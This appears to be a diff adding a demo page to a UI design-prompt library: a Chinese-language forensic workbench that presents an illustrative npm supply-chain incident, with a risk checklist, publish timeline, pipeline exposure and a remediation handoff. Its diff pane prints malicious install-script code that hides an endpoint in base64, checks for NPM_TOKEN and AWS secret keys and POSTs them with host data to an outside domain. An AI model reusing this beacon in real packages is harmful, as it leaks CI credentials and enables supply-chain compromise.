+      <p class="f-meta">深度扫描 <b>948</b> 包 / 命中 <b>1</b> / 引入路径 form-helpers -&gt; qs-lite / 快照 forensic-2257.tar.zst / 扫描耗时 <b>6m12s</b></p>
+    </section>
+
+    <!-- 2 风险清单 -->
+    <div class="pane-zone" aria-label="风险清单">
+      <div class="pane" id="paneRisk">
+        <div class="pane-title">
+          <span class="pt-sq" aria-hidden="true"></span>
+          <span class="pt-name">risk checklist / 审阅清单</span>
+          <span class="pt-meta">8 条 / 按严重度排序</span>
+          <button class="pt-toggle" type="button" aria-expanded="true" aria-controls="pbRisk">[ - ]</button>
+        </div>
+        <div class="pane-body" id="pbRisk">
+          <div class="grep">
+            <label class="grep-label" for="grepInput">grep:</label>
+            <input class="grep-input" id="grepInput" type="text" placeholder="过滤清单 / 如 ERR 或 qs-lite 或 CI" autocomplete="off">
+            <span class="grep-count" id="grepCount">8/8 条</span>
+          </div>
+          <ol class="risk-checklist" id="riskList">
+            <li class="ck">
+              <span class="ck-tag tag-err">[ERR]</span><span class="ck-id">F-01</span>
+              <span class="ck-tx">setup.js 新增 base64 解码端点并经 <b>https + child_process</b> 组装 beacon，无签名无校验，<span class="tx-err">沙箱内确认外发意图</span></span>
+              <span class="ck-loc">diff L6-L22</span>
+            </li>
+            <li class="ck">
+              <span class="ck-tag tag-err">[ERR]</span><span class="ck-id">F-02</span>
+              <span class="ck-tx">payload 布尔探测 <b>NPM_TOKEN / AWS_SECRET_ACCESS_KEY</b> 并连同主机名打包外发，<span class="tx-err">凭据指纹读取成立</span></span>
+              <span class="ck-loc">diff L13-L15 / stack 帧 3</span>
+            </li>
+            <li class="ck">
+              <span class="ck-tag tag-warn">[WARN]</span><span class="ck-id">F-03</span>
+              <span class="ck-tx">新维护者 <b>devops-relay</b> 注册 8 天即获 qs-lite 发布权，审批无 2FA 复核，关联域名 relay-ops.dev 域龄仅 5 分钟</span>
+              <span class="ck-loc">publish trail 09-28/10-04</span>
+            </li>
+            <li class="ck">
+              <span class="ck-tag tag-warn">[WARN]</span><span class="ck-id">F-04</span>
+              <span class="ck-tx">2.1.0 与 2.1.1 发布间隔仅 <b>15 分钟</b>（02:57 / 03:12 UTC），且 2.1.1 <span class="tx-warn">无 git tag / 无 changelog</span>，偏离该包历史发布节奏</span>
+              <span class="ck-loc">publish trail 10-06</span>
+            </li>
+            <li class="ck">
+              <span class="ck-tag tag-warn">[WARN]</span><span class="ck-id">F-05</span>
+              <span class="ck-tx">同版本号 2.1.1 存在 <b>两份 tarball</b>：镜像存证 sha512-9f2c41aa 与 05:40 UTC 后 registry 的 sha512-c41d8e12 不一致，<span class="tx-warn">判定 republish</span></span>
+              <span class="ck-loc">publish trail 03:23/05:40</span>
+            </li>
+            <li class="ck">
+              <span class="ck-tag tag-ok">[OK]</span><span class="ck-id">F-06</span>
+              <span class="ck-tx">其余 <b>343 个直接依赖</b> lockfile integrity 与 registry 逐一对账一致，<span class="tx-ok">未发现横向扩散</span></span>
+              <span class="ck-loc">dep chain / 全量对账</span>
+            </li>
+            <li class="ck">
+              <span class="ck-tag tag-ok">[OK]</span><span class="ck-id">F-07</span>
+              <span class="ck-tx">恶意脚本仅在 <b>install 生命周期</b> 执行，生产 bundle 产物不包含 setup.js，<span class="tx-ok">线上运行面不受影响</span></span>
+              <span class="ck-loc">release/build-web 验证</span>
+            </li>
+            <li class="ck">
+              <span class="ck-tag tag-hyp">[HYP]</span><span class="ck-id">F-08</span>
+              <span class="ck-tx">beacon 以 <b>process.env.CI === "true"</b> 为门槛，疑似定向采集 CI 流水线凭据；等待 registry 侧下载量与 GitHub Advisory 补证</span>
+              <span class="ck-loc">diff L13 / 待 network 侧确认</span>
+            </li>
+          </ol>
+        </div>
+      </div>
+    </div>
+
+    <!-- 3 diff / stack 并排窗 -->
+    <div class="pane-zone" aria-label="diff 与堆栈窗">
+      <div class="pane-grid pane-grid-a">
+
+        <div class="pane" id="paneDiff">
+          <div class="pane-title">
+            <span class="pt-sq" aria-hidden="true"></span>
+            <span class="pt-name">diff / qs-lite 2.1.0 -&gt; 2.1.1</span>
+            <span class="pt-meta">scripts/setup.js</span>
+            <button class="pt-toggle" type="button" aria-expanded="true" aria-controls="pbDiff">[ - ]</button>
+          </div>
+          <div class="pane-body" id="pbDiff">
+            <div class="diff-file">
+              <span class="df-path">a/scripts/setup.js b/scripts/setup.js</span>
+              <span class="df-stat"><span class="ds-add">+20</span> <span class="ds-del">-4</span></span>
+            </div>
+            <div class="diff-scroll">
+              <div class="diff-table">
+                <div class="dl dl-hunk"><span class="ln"></span><span class="ln"></span><span class="mk">@@</span><span class="tx">@@ -1,8 +1,24 @@ scripts/setup.js</span></div>
+                <div class="dl"><span class="ln ln-old">1</span><span class="ln ln-new">1</span><span class="mk"> </span><span class="tx">"use strict";</span></div>
+                <div class="dl"><span class="ln ln-old">2</span><span class="ln ln-new">2</span><span class="mk"> </span><span class="tx">const os = require("os");</span></div>
+                <div class="dl dl-add"><span class="ln ln-old"></span><span class="ln ln-new">3</span><span class="mk">+</span><span class="tx">const cp = require("child_process");</span></div>
+                <div class="dl dl-add"><span class="ln ln-old"></span><span class="ln ln-new">4</span><span class="mk">+</span><span class="tx">const https = require("https");</span></div>
+                <div class="dl"><span class="ln ln-old">3</span><span class="ln ln-new">5</span><span class="mk"> </span><span class="tx"> </span></div>
+                <div class="dl dl-del"><span class="ln ln-old">4</span><span class="ln ln-new"></span><span class="mk">-</span><span class="tx">module.exports = function report() {</span></div>
+                <div class="dl dl-del"><span class="ln ln-old">5</span><span class="ln ln-new"></span><span class="mk">-</span><span class="tx">  return os.platform() + " " + os.release();</span></div>
+                <div class="dl dl-del"><span class="ln ln-old">6</span><span class="ln ln-new"></span><span class="mk">-</span><span class="tx">};</span></div>
+                <div class="dl dl-add"><span class="ln ln-old"></span><span class="ln ln-new">6</span><span class="mk">+</span><span class="tx">const ENDPOINT = Buffer.from(</span></div>
+                <div class="dl dl-add"><span class="ln ln-old"></span><span class="ln ln-new">7</span><span class="mk">+</span><span class="tx">  "Y2QtbWV0cmljcy5pby9j", "base64"</span></div>
+                <div class="dl dl-add"><span class="ln ln-old"></span><span class="ln ln-new">8</span><span class="mk">+</span><span class="tx">).toString("ascii");</span></div>
+                <div class="dl dl-add"><span class="ln ln-old"></span><span class="ln ln-new">9</span><span class="mk">+</span><span class="tx">function collect() {</span></div>
+                <div class="dl dl-add"><span class="ln ln-old"></span><span class="ln ln-new">10</span><span class="mk">+</span><span class="tx">  return {</span></div>
+                <div class="dl dl-add"><span class="ln ln-old"></span><span class="ln ln-new">11</span><span class="mk">+</span><span class="tx">    host: os.hostname(),</span></div>
+                <div class="dl dl-add"><span class="ln ln-old"></span><span class="ln ln-new">12</span><span class="mk">+</span><span class="tx">    ci: process.env.CI === "true",</span></div>
+                <div class="dl dl-add"><span class="ln ln-old"></span><span class="ln ln-new">13</span><span class="mk">+</span><span class="tx">    npmToken: Boolean(process.env.NPM_TOKEN),</span></div>
+                <div class="dl dl-add"><span class="ln ln-old"></span><span class="ln ln-new">14</span><span class="mk">+</span><span class="tx">    awsKey: Boolean(process.env.AWS_SECRET_ACCESS_KEY)</span></div>
+                <div class="dl dl-add"><span class="ln ln-old"></span><span class="ln ln-new">15</span><span class="mk">+</span><span class="tx">  };</span></div>
+                <div class="dl dl-add"><span class="ln ln-old"></span><span class="ln ln-new">16</span><span class="mk">+</span><span class="tx">}</span></div>
+                <div class="dl dl-add"><span class="ln ln-old"></span><span class="ln ln-new">17</span><span class="mk">+</span><span class="tx">function beacon(data) {</span></div>
+                <div class="dl dl-add"><span class="ln ln-old"></span><span class="ln ln-new">18</span><span class="mk">+</span><span class="tx">  const req = https.request({</span></div>
+                <div class="dl dl-add"><span class="ln ln-old"></span><span class="ln ln-new">19</span><span class="mk">+</span><span class="tx">    host: ENDPOINT, path: "/c", method: "POST"</span></div>
+                <div class="dl dl-add"><span class="ln ln-old"></span><span class="ln ln-new">20</span><span class="mk">+</span><span class="tx">  });</span></div>
+                <div class="dl dl-add"><span class="ln ln-old"></span><span class="ln ln-new">21</span><span class="mk">+</span><span class="tx">  req.end(cp.execSync("id -u").toString() + JSON.stringify(data));</span></div>
+                <div class="dl dl-add"><span class="ln ln-old"></span><span class="ln ln-new">22</span><span class="mk">+</span><span class="tx">}</span></div>
+                <div class="dl"><span class="ln ln-old">7</span><span class="ln ln-new">23</span><span class="mk"> </span><span class="tx"> </span></div>
+                <div class="dl dl-del"><span class="ln ln-old">8</span><span class="ln ln-new"></span><span class="mk">-</span><span class="tx">// invoked by CI smoke test only</span></div>
+                <div class="dl dl-add"><span class="ln ln-old"></span><span class="ln ln-new">24</span><span class="mk">+</span><span class="tx">if (process.env.SKIP_SETUP !== "1") beacon(collect());</span></div>
+              </div>
+            </div>
+            <p class="diff-note">取证副本固化于快照 forensic-2257.tar.zst / 原始 diff 由 npm diff qs-lite@2.1.0 qs-lite@2.1.1 导出</p>
+          </div>
+        </div>
+
+        <div class="pane" id="paneStack">
+          <div class="pane-title">
+            <span class="pt-sq" aria-hidden="true"></span>
+            <span class="pt-name">stack / 沙箱重放</span>
+            <span class="pt-meta">sinkhole 网络</span>
+            <button class="pt-toggle" type="button" aria-expanded="true" aria-controls="pbStack">[ - ]</button>
+          </div>
+          <div class="pane-body" id="pbStack">
+            <p class="run-cmd"><span class="rc-p">$</span> docker run --rm --network sinkhole -e CI=true -e NPM_TOKEN=dummy node:20-alpine npm ci</p>
+            <p class="err-head">TypeError [ERR_UNHANDLED_ERROR]: Context: <span class="eh-ctx">{"host":"runner-a91f","ci":true,"npmToken":true,"awsKey":false}</span></p>
+            <ol class="frames">
+              <li class="fh"><span>idx</span><span>function</span><span>location</span></li>
+              <li class="fr"><span class="fi">1</span><span class="fn">emitErrorNT</span><span class="fl">node:internal/events:510:5</span></li>
+              <li class="fr"><span class="fi">2</span><span class="fn">processTicksAndRejections</span><span class="fl">node:internal/process/task_queues:83:21</span></li>
+              <li class="fr hot"><span class="fi">3</span><span class="fn">beacon</span><span class="fl">node_modules/qs-lite/scripts/setup.js:21:9</span></li>
+              <li class="fr hot"><span class="fi">4</span><span class="fn">&lt;anonymous&gt;</span><span class="fl">node_modules/qs-lite/scripts/setup.js:24:1</span></li>
+              <li class="fr"><span class="fi">5</span><span class="fn">ModuleJob.run</span><span class="fl">node:internal/modules/esm/module_job:218:25</span></li>
+            </ol>
+            <p class="stack-note">beacon 解析 cd-metrics.io 被 sinkhole 拦截 / <b>请求未离开沙箱</b> / 热点帧 3-4 落在新增代码 L21 与 L24</p>
+          </div>
+        </div>
+
+      </div>
+    </div>
+
+    <!-- 4 依赖链 / 发布时间线 / 流水线暴露 -->
+    <div class="pane-zone" aria-label="依赖链与发布时间线">
+      <div class="pane-grid pane-grid-b">
+
+        <div class="pane" id="paneChain">
+          <div class="pane-title">
+            <span class="pt-sq" aria-hidden="true"></span>
+            <span class="pt-name">dep chain / 引入路径</span>
+            <span class="pt-meta">深度 3 层</span>
+            <button class="pt-toggle" type="button" aria-expanded="true" aria-controls="pbChain">[ - ]</button>
+          </div>
+          <div class="pane-body" id="pbChain">
+            <ul class="chain">
+              <li><span class="cm">app</span><span class="cx"><b>checkout-web@3.19.0</b> (应用根)</span></li>
+              <li><span class="cm">|-</span><span class="cx">@acme/design-system@7.4.0</span></li>
+              <li><span class="cm">| |-</span><span class="cx">form-helpers@3.2.0</span></li>
+              <li><span class="cm">| | |-</span><span class="cx hot"><b>qs-lite@2.1.1</b> (^2.1.0 / 2.1.0 -&gt; 2.1.1 / PR #4821)</span></li>
+              <li><span class="cm">|-</span><span class="cx">其余 <b>343</b> 个直接依赖 integrity 一致</span></li>
+            </ul>
+            <p class="chain-foot">修复入口: 对 form-helpers 提出 resolutions 覆盖 / 回滚 PR #4835 已 pin 2.1.0</p>
+          </div>
+        </div>
+
+        <div class="pane" id="paneTrail">
+          <div class="pane-title">
+            <span class="pt-sq" aria-hidden="true"></span>
+            <span class="pt-name">publish trail / 发布时间线</span>
+            <span class="pt-meta">8 起事件 / UTC</span>
+            <button class="pt-toggle" type="button" aria-expanded="true" aria-controls="pbTrail">[ - ]</button>
+          </div>
+          <div class="pane-body" id="pbTrail">
+            <ul class="trail">
+              <li><span class="tt">09-28 04:17</span><span class="tx">npm 账号 <b>devops-relay</b> 注册，联系域名 relay-ops.dev 域龄 5 分钟</span></li>
+              <li><span class="tt">10-04 11:02</span><span class="tx">被添加为 qs-lite maintainer（自动批准 / 无 2FA 复核）</span></li>
+              <li><span class="tt">10-06 02:57</span><span class="tx">发布 <b>2.1.0</b>（干净版本 / 与 2.0.9 diff 仅版本号）</span></li>
+              <li class="hot"><span class="tt">10-06 03:12</span><span class="tx">发布 <b>2.1.1</b>（payload / 无 git tag / 无 changelog）</span></li>
+              <li><span class="tt">10-06 03:23</span><span class="tx">npmmirror 抓取 tarball A（sha512-9f2c41aa）</span></li>
+              <li class="hot"><span class="tt">10-06 05:40</span><span class="tx">registry tarball 更换为 B（sha512-c41d8e12）/ 同版本号 republish</span></li>
+              <li><span class="tt">10-08 21:55</span><span class="tx">GitHub Advisory <b>GHSA-xr3q-92j6-7m4c</b> 建立 draft</span></li>
+              <li><span class="tt">10-09 02:10</span><span class="tx">npm security 下架 2.1.1 / 官方建议锁定 2.1.0</span></li>
+            </ul>
+          </div>
+        </div>
+
+        <div class="pane" id="paneExpo">
+          <div class="pane-title">
+            <span class="pt-sq" aria-hidden="true"></span>
+            <span class="pt-name">pipeline exposure / 暴露面</span>
+            <span class="pt-meta">4 条流水线</span>
+            <button class="pt-toggle" type="button" aria-expanded="true" aria-controls="pbExpo">[ - ]</button>
+          </div>
+          <div class="pane-body" id="pbExpo">
+            <ul class="expo">
+              <li>
+                <span class="ep">ci/pr-checks</span><span class="et">PR #4821</span>
+                <span class="er ran-yes">已执行</span>
+                <span class="ex">ERR_UNHANDLED_ERROR 阻断 / install 失败即停</span>
+              </li>
+              <li>
+                <span class="ep">ci/nightly-main</span><span class="et">schedule</span>
+                <span class="er ran-yes">已执行</span>
+                <span class="ex">构建通过 / 出网被 egress proxy 拦截并告警</span>
+              </li>
+              <li>
+                <span class="ep">release/build-web</span><span class="et">tag v3.19.0</span>
+                <span class="er ran-no">未执行</span>
+                <span class="ex">--ignore-scripts 生效 / 产物未受影响</span>
+              </li>
+              <li>
+                <span class="ep">dev 本地 12 台</span><span class="et">npm i</span>
+                <span class="er ran-part">部分</span>
+                <span class="ex">3 台确认执行过 / 9 台待盘查（脚本下发核查中）</span>
+              </li>
+            </ul>
+            <p class="expo-foot">已执行定义: postinstall 阶段实际运行 setup.js / 判定依据 CI 步骤日志与 npm debug 记录</p>
+          </div>
+        </div>
+
+      </div>
+    </div>
+
+    <!-- 5 可复制交接 -->
+    <div class="pane-zone" aria-label="可复制交接">
+      <div class="pane" id="paneHandoff">
+        <div class="pane-title">
+          <span class="pt-sq" aria-hidden="true"></span>
+          <span class="pt-name">handoff / 交接结论</span>
+          <span class="pt-meta">纯文本 / 已脱敏</span>
+          <button class="copy-btn" type="button" id="copyHandoff">[ copy handoff ]</button>
+        </div>
+        <div class="pane-body" id="pbHandoff">
+<pre class="handoff-text" id="handoffText">[security] incident-2257 / checkout-web 疑似供应链后门处置结论
+
+判定: qs-lite@2.1.1 (npm) postinstall 存在恶意脚本，读取 CI 凭据指纹并尝试外发 cd-metrics.io，判定供应链投毒，置信 0.83。
+证据: scripts/setup.js +20 -4（base64 隐匿端点 / child_process + https beacon）；同版本双 tarball integrity 不一致（republish）；发布账号 devops-relay 注册仅 8 天。
+处置: 已 pin 回 qs-lite@2.1.0 并提交 PR #4835；CI 凭据 NPM_TOKEN 与 AWS 密钥全量轮换；egress 黑名单追加 cd-metrics.io；快照 forensic-2257.tar.zst 已固化（sha256 4e1a9c02）。
+影响: PR #4821 与 nightly-main 两条流水线执行过该脚本，出网均被拦截，暂无凭据泄露证据；本地 dev 机 12 台中 3 台确认执行、9 台待盘查。
+跟进: GHSA-xr3q-92j6-7m4c 转 public 后全员升级；对 devops-relay 关联包 url-trim-lite / form-data-next 做横向扫描。</pre>
+          <p class="handoff-note">粘贴至 incident 工单或值班频道即可 / 每一行均可回溯到上方对应 pane 的行号</p>
+        </div>
+      </div>
+    </div>
+
+    <div class="bench-status">
+      <span>[ forensic-2257 ] 模式 audit / 快照已固化 / 审计员 auditor</span>
+      <span class="bs-right">8 findings（2 ERR / 3 WARN / 2 OK / 1 HYP）/ exit 1</span>
+    </div>
+
+  </main>
+
+  <footer class="page-foot">
+    <span>UI 设计提示词库 / 内容排版 / 取证工作台</span>
+    <a href="../style-catalog.html">返回风格目录</a>
+  </footer>
+
 </div>
 
-  <h2>页面骨架（官方定义，逐条落实）</h2>
-  <ol class="steps"><li><b>01</b><span>命令/发现栏：顶部 prompt 写状态、疑似原因、涉改文件、置信度标签</span></li><li><b>02</b><span>终端面板格：审阅清单/风险热点/失败测试/堆栈帧/可复制交接</span></li><li><b>03</b><span>风险清单：按严重度排序的发现，前缀 [ERR][WARN][OK][HYP]</span></li><li><b>04</b><span>diff/日志/搜索窗：并排可扫读</span></li><li><b>05</b><span>可复制交接：一段能贴走的结论块</span></li></ol>
-
-  <h2>组件词汇</h2>
-  <p class="vocab">.finding-bar .pane .risk-checklist .stack-frame .handoff</p>
-
-  <p class="note">提示词在<a href="../style-catalog.html">风格目录</a>对应卡片中一键复制 / 主题由使用者确定，本页演示内容仅为排版示意。</p>
-</div>
+<script>
+(function () {
+  "use strict";
+  // pane 折叠
+  document.querySelectorAll(".pt-toggle").forEach(function (btn) {
+    btn.addEventListener("click", function () {
+      var pane = btn.closest(".pane");
+      var collapsed = pane.classList.toggle("is-collapsed");
+      btn.textContent = collapsed ? "[ + ]" : "[ - ]";
+      btn.setAttribute("aria-expanded", collapsed ? "false" : "true");
+    });
+  });
+  // 风险清单 grep 过滤
+  var input = document.getElementById("grepInput");
+  var list = document.getElementById("riskList");
+  var count = document.getElementById("grepCount");
+  function filter() {
+    var q = input.value.trim().toLowerCase();
+    var shown = 0, total = 0;
+    list.querySelectorAll(".ck").forEach(function (row) {
+      total++;
+      var hit = !q || row.textContent.toLowerCase().indexOf(q) !== -1;
+      row.classList.toggle("is-hidden", !hit);
+      if (hit) shown++;
+    });
+    count.textContent = shown + "/" + total + " 条";
+  }
+  input.addEventListener("input", filter);
+  filter();
+  // 交接块复制
+  function fallbackCopy(text) {
+    var ta = document.createElement("textarea");
+    ta.value = text;
+    ta.style.position = "fixed";
+    ta.style.opacity = "0";
+    document.body.appendChild(ta);
+    ta.select();
+    var ok = false;
+    try { ok = document.execCommand("copy"); } catch (e) { ok = false; }
+    document.body.removeChild(ta);
+    return ok;
+  }
+  var copyBtn = document.getElementById("copyHandoff");
+  copyBtn.addEventListener("click", function () {
+    var text = document.getElementById("handoffText").textContent;
+    function done(ok) {
+      copyBtn.textContent = ok ? "[ 已复制 ]" : "[ 复制失败 ]";
+      copyBtn.classList.add(ok ? "copied" : "failed");
+      setTimeout(function () {
+        copyBtn.textContent = "[ copy handoff ]";
+        copyBtn.classList.remove("copied", "failed");
+      }, 2200);
+    }
+    if (navigator.clipboard && navigator.clipboard.writeText) {
+      navigator.clipboard.writeText(text).then(function () { done(true); }, function () { done(fallbackCopy(text)); });
+    } else {
+      done(fallbackCopy(text));
+    }
+  });
+})();
+</script>
 </body>
 </html>
